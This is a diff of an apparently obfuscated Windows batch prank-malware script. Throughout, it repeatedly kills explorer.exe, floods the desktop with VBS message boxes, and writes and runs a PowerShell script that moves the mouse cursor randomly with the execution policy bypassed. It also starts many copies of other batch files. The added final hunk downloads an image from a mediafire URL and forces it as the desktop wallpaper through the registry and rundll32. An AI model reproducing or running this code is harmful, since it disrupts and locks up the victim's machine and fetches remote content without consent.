@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJiZkoaHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsGAlXMbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZkkaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlbMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -34,10 +34,10 @@
 @echo off
 mode 30 , 01
 powershell -window minimized -command "" 
-cd C:\Users\%username%\Desktop
-echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
+cd C:\Users\%username%\Desktop
+echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 start
 start
 start
@@ -49,13 +49,12 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 TASKKILL /F /IM EXPLORER.EXE
-start explorer.exe
 echo $Cursor = [system.windows.forms.cursor]::Clip >> Mouse.ps1
 echo [System.Reflection.Assembly]::LoadWithPartialName("system.windows.forms") >> Mouse.ps1
 echo for ($i=1;$i -lt 10000000;$i++) { >> Mouse.ps1
 echo $Position = [system.windows.forms.cursor]::Position >> Mouse.ps1
 echo $PositionChange = Get-Random 30 >> Mouse.ps1
-echo switch (Get-Random 1) { >> Mouse.ps1
+echo switch (Get-Random 10) { >> Mouse.ps1
 echo     0 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y + $PositionChange))} >> Mouse.ps1
 echo     1 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(($Position.x + $PositionChange),$Position.y)} >> Mouse.ps1
 echo     2 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y - $PositionChange))} >> Mouse.ps1
@@ -68,6 +67,7 @@ echo "#> >> Mouse.ps1
 echo powershell.exe -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\Mouse.ps1" >> M0US3rrR.bat 
 start M0US3rrR.bat 
 start
+start explorer.exe
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start hhhh.vbs 
@@ -157,7 +157,6 @@ cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
-
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
@@ -674,6 +673,20 @@ start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
+cd C:\ 
+md WWbbbkk
+cd C:\WWbbbkk powershell wget -outf Bbllkk.png https://download1502.mediafire.com/us304z4tyh9g/xyu3gsdpv742gne/n.png 
+echo Function Set-WallPaper($Value) >> KKKKllkjsdi.ps1
+echo { >> KKKKllkjsdi.ps1
+echo Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value >> KKKKllkjsdi.ps1 
+echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1 
+echo } ">> KKKKllkjsdi.ps1  
+echo Set-WallPaper -value C:\WWbbbkk\Bbllkk.png >> KKKKllkjsdi.ps1  
+powershell.exe -ExecutionPolicy Bypass -File "C:\WWbbbkk\KKKKllkjsdi.ps1" 
+rundll32.exe user32.dll, UpdatePerUserSystemParameters 
+rundll32.exe user32.dll, UpdatePerUserSystemParameters 
+rundll32.exe user32.dll, UpdatePerUserSystemParameters 
+rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
